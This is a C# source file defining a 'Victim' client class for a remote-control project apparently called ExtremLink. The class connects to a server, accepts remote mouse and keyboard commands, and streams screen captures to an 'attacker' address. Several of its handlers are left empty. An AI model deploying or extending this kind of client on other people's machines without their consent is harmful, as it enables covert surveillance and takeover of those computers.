using Newtonsoft.Json.Linq;
using Newtonsoft.Json;
using System;
using System.Drawing;
using System.Windows.Forms;
using System.Windows.Interop;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Input;
using System.IO;
using System.Windows.Media.Imaging;
using System.Windows;
using System.Net;
using System.Net.Sockets;
using OpenCvSharp;
using System.Runtime.InteropServices;

namespace ExtremLink_Client_v2.Classes
{
    class Victim : Client
    {
        // *****************************************
        // A class which represent a victim.
        // The class inherits from the client class.
        // *****************************************

        // Attributes:

        // Integer constants which represent the sockets' ports:
        public readonly int VICTIM_TCP_PORT = 1847;
        public readonly int VICTIM_UDP_PORT = 1848;
        public readonly int VICTIM_SESSION_TCP_PORT = 1849;

        // Import GetSystemMetrics from user32.dll
        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);


        // The screen size:
        private int screenWidth = GetSystemMetrics(0);
        private int screenHeight = GetSystemMetrics(1);


        // A string which represent the attacker's IP address:
        private string attackerIpAddr;
        public string AttackerIpAddr
        {
            get { return this.attackerIpAddr; }
        }

        // Singelton behavior:
        private static Victim victimInstance = null;
        public static Victim VictimInstance
        {
            get
            {
                if (victimInstance == null)
                {
                    victimInstance = new Victim();
                }
                return victimInstance;
            }
        }

        // Constructor:
        private Victim() : base()
        {

        }

        public void ConnectToServer(string serverIpAddr)
        {
            // Input: A string which represent the server ip address.
            // The function connects the TCP socket to the server.
            this.serverIpAddr = serverIpAddr;
            this.tcpSocket.Connect(new IPEndPoint(IPAddress.Parse(this.serverIpAddr), this.VICTIM_TCP_PORT));
            this.serverUdpEndPoint = new IPEndPoint(IPAddress.Parse(this.serverIpAddr), this.VICTIM_UDP_PORT);
            this.sessionTcpSocket.Connect(new IPEndPoint(IPAddress.Parse(this.serverIpAddr), this.VICTIM_SESSION_TCP_PORT));
        }
        public void Start()
        {
            // The function gets nothing.
            // The function starts the tasks of the functions which handling with packets.
            Task.Run(() => this.HandleUdpCommunication());
            Task.Run(() => this.HandleTcpCommunication());
        }


        // Sending basic messages functions:
        private void SendMessageToClient(string typeOfMessage, string message, Socket socket)
        {
            // Input: A string which represent the message and the socket.
            // Output: The function sends the message via the given socket.
            byte[] buffer = Encoding.UTF8.GetBytes($"{typeOfMessage}|{message.Length}|{message}|EOM"); // EOM - "end of message"

            // Only compress if it's TCP
            switch (socket.ProtocolType)
            {
                case ProtocolType.Tcp:
                    socket.Send(buffer);
                    break;
                case ProtocolType.Udp:
                    socket.SendTo(buffer, new IPEndPoint(IPAddress.Parse(this.serverIpAddr), this.VICTIM_UDP_PORT));
                    break;
            }
        }
        public void SendTCPMessageToClient(string typeOfMessage, string message)
        {
            // Input: A string which represent the message.
            // Output: The function sends the message via the tcp socket.
            this.SendMessageToClient(typeOfMessage, message, this.tcpSocket);
        }
        public void SendUDPMessageToClient(string typeOfMessage, string message)
        {
            // Input: A string which represent the message.
            // Output: The function sends the message via the tcp socket.
            this.SendMessageToClient(typeOfMessage, message, this.tcpSocket);
        }


        // Getting basic messages functions:
        private List<object> OrderMessage(string message)
        {
            // The function gets a string which represent a message received from the client.
            // The fucntion returns the message as a list object which contains the message by it's parameters.
            string[] messageParts = message.Split('|');

            // Validate message format
            if (messageParts.Length != 4)
            {
                throw new Exception("The message isn't in the right format!");
            }
            if (messageParts[3] != "EOM")
            {
                throw new Exception("End of message wasn't fully received");
            }

            List<object> messagePartsList = new List<object>
                {
                    messageParts[0],                    // Message type
                    int.Parse(messageParts[1]),         // Data length
                    messageParts[2],                    // Data content
                    messageParts[3]                     // End of message marker
                };

            return messagePartsList;
        }
        public List<object> GetTCPMessageFromClient()
        {
            // Input: Nothing.
            // Output: The received message from the client via he tcp socket as a list of parameters.
            byte[] buffer = new byte[4096];
            int receivedBytes = this.tcpSocket.Receive(buffer);
            return this.OrderMessage(Encoding.UTF8.GetString(buffer, 0, receivedBytes));
        }
        public List<object> GetUDPMessageFromClient()
        {
            // Input: Nothing.
            // Output: The received message from the client via the udp socket as a list of parameters.
            byte[] buffer = new byte[4096];
            EndPoint remoteEndPoint = new IPEndPoint(IPAddress.Any, 0);
            int receivedBytes = this.udpSocket.ReceiveFrom(buffer, ref remoteEndPoint);
            return this.OrderMessage(Encoding.UTF8.GetString(buffer, 0, receivedBytes));
        }


        // Sockets handlers:
        // Tcp handler function:
        private async Task HandleTcpCommunication()
        {
            // Input: Nothing.
            // Output: The function handles with different types of messages over the tcp socket.
            // The types of message are:
            // G - General stuff messages handling
            // ! - Database functionality
            // & - Frames handling
            // % - Mouse handling
            // $ - Sessions handling
            while (true)
            {
                List<object> message = this.GetTCPMessageFromClient();
                string data = (string)message[2];
                // MessageBox.Show($"type:{message[0]}, data:{data}");

                switch (message[0])
                {
                    case "G":
                        this.HandleGeneralStuffMessages(data);
                        break;
                    case "!":
                        this.HandleUsersManagmentCommands(data);
                        break;
                    case "%":
                        this.HandleMouseInput(data);
                        break;
                    case "^":
                        this.HandleKeyboardInput(data);
                        break;
                    case "&":
                        this.HandleFramesCommands(data);
                        break;
                    case "$":
                        this.HandleSessionsCommands(data);
                        break;
                }
                
            }
        }

        // Udp handler function:
        private async Task HandleUdpCommunication()
        {
            // Input: Nothing.
            // Output: The function handles with different types of messages over the udp socket.
            // & - Frames handling.
        }
        
        
        // Sub-Handlers:

            // Handle general stuff messages:
        private void HandleGeneralStuffMessages(string data)
        {
            // Input: A string which represent a given general stuff message from the server.
            // Output: The function handle with the given message.
            dynamic message = JsonConvert.DeserializeObject(data);
            JObject jsonData = (JObject)message;
            if (jsonData.ContainsKey("attacker"))
            {
                this.attackerIpAddr = message.attacker;
            }
        }

        // Handle with user managment commands:
        private void HandleUsersManagmentCommands(string data)
        {
            // Input: a string which represent a given user managments command from the server.
            // Output: The function handle with the commands.
            switch (data)
            {
                case "Exist":
                    this.serverRespond = "Exist";
                    break;
                case "NotExist":
                    this.serverRespond = "NotExist";
                    break;
                case "SuccessfullyAdded":
                    this.serverRespond = "SuccessfullyAdded";
                    break;
                case "NotAdded":
                    this.serverRespond = "NotAdded";
                    break;
            }
        }

        // Handle with frames commands:
        private void HandleFramesCommands(string data)
        {
            // Input: a string which represent a given frames command from the server.
            // Output: The function handles with the frames commands.
            switch (data)
            {
                case "StartSendFrames":
                    this.serverRespond = "StartSendFrames";
                    break;
                case "StopSendFrames":
                    this.serverRespond = "StopSendFrames";
                    break;
                case "PauseSendFrames":
                    this.serverRespond = "PauseSendFrames";
                    break;
            }
        }

        // Handle Input commands:
        private void HandleMouseInput(string message)
        {
            // Input: string object which represent the message that was given from the server.
            // Ouput: The function update the CustomMouse object according to the given message's parameters.

            // Reading the data in json format
            dynamic data = JsonConvert.DeserializeObject(message);

            // Casting the data dynamic object to JObject
            JObject jsonData = (JObject)data;
            
            int screenWidthRatio = this.screenWidth / 800;
            int screenHeightRatio = this.screenHeight / 450;

            // Checking if changing position is needed
            if (jsonData.ContainsKey("x") && jsonData.ContainsKey("y"))
            {
                CustomMouseVictim.CustomMouseInstance.ChangePosition((float)data.x * screenWidthRatio, (float)data.y * screenHeightRatio);
            }

            // Updating the mouse parameters according to the given message
            switch ((string)data.type)
            {
                case "mouseMove":
                    CustomMouseVictim.CustomMouseInstance.CurrentCommand = VictimMouseCommands.Move;
                    break;
                case "mouseLeftPress":
                    CustomMouseVictim.CustomMouseInstance.CurrentCommand = VictimMouseCommands.LeftPress;
                    break;
                case "mouseRightPress":
                    CustomMouseVictim.CustomMouseInstance.CurrentCommand = VictimMouseCommands.RightPress;
                    break;
            }
        }
        private void HandleKeyboardInput(string message)
        {
            // Input: string which represent a keyboard commands query message.
            // Ouput: The function update the CustomKeyboard object according to the given message's parameters.

            // Reading the data in json format
            dynamic data = JsonConvert.DeserializeObject(message);

            // Casting the data dynamic object to JObject
            JObject jsonData = (JObject)data;

            switch ((string)data.type)
            {
                case "keyPress":
                    CustomKeyboardVictim.CustomKeyboardInstance.CurrentKeyboardCommand = VictimKeyboardCommands.KeyPress;
                    CustomKeyboardVictim.CustomKeyboardInstance.CurrentKey = (Key)Enum.Parse(typeof(Key), data.PressedKey);
                    break;
            }
        }
        
        // Handle Sessions commands:
        private void HandleSessionsCommands(string message)
        {
            // Input: A string which represent the server message.
            // Output: The function handles which the sessions message.

            // Reading the data in json format
            dynamic data = JsonConvert.DeserializeObject(message);

            // Casting the data dynamic object to JObject
            JObject jsonData = (JObject)data;

        }


        // Init server respond string
        public void InitServerRespond()
        {
            // Input: Nothing.
            // Output: The function initilaize the server respond string by inserting it empty string
            this.serverRespond = "";
        }


        // Sending frame functions:
        public void CreatePngFile(RenderTargetBitmap frame, string newFileName)
        {
            // Input: A RenderTargetBitmap object which represent a frame from the sharescreen.
            // Output: The function creates a png file which contains the image and returns it's name.
            if (frame == null)
            {
                throw new ArgumentNullException(nameof(frame), "RenderTargetBitmap cannot be null");
            }
            // Create a PNG encoder
            PngBitmapEncoder encoder = new PngBitmapEncoder();

            // Add the frame to the encoder
            encoder.Frames.Add(BitmapFrame.Create(frame));

            try
            {
                // Save the encoded image to a file
                using (FileStream fs = new FileStream(newFileName, FileMode.Create, FileAccess.Write))
                {
                    encoder.Save(fs);
                }
            }
            catch (Exception ex)
            {
                throw new IOException($"Failed to create PNG file: {ex.Message}", ex);
            }
        }
        public byte[] GetFileContent(string fileName)
        {
            try
            {
                // Read all bytes of the file into a byte array
                byte[] fileContent = File.ReadAllBytes(fileName);
                return fileContent;
            }
            catch (Exception ex)
            {
                // Handle exceptions such as file not found or permission issues
                throw new IOException($"Failed to read file content: {ex.Message}", ex);
            }
        }
        public void SendFrame(byte[] frame)
        {
            // Input: A byte array which contains the content of a file which contains the frame.
            // Output: The function sends the given byte array to the Attacker.

            // Define packet size (MTU-safe)
            const int packetSize = 1400; // Keeping under the MTU limit
            int totalPackets = (int)Math.Ceiling((double)frame.Length / packetSize);

            // Generate a random stream ID to identify this data stream
            int streamId = new Random().Next(1, int.MaxValue);

            // Send packets
            // MessageBox.Show($"{totalPackets}");
            for (int i = 0; i < totalPackets; i++)
            {
                // Calculate packet bounds
                int offset = i * packetSize;
                int size = Math.Min(packetSize, frame.Length - offset);

                // Construct packet (12 bytes of metadata + segment data)
                byte[] packet = new byte[size + 12];
                BitConverter.GetBytes(streamId).CopyTo(packet, 0);         // 4 bytes: Stream ID
                BitConverter.GetBytes(totalPackets).CopyTo(packet, 4);     // 4 bytes: Total packets
                BitConverter.GetBytes(i).CopyTo(packet, 8);                // 4 bytes: Packet index
                Array.Copy(frame, offset, packet, 12, size);               // Segment data

                // Send packet
                this.udpSocket.SendTo(packet, this.serverUdpEndPoint);
            }
        }

    }
}


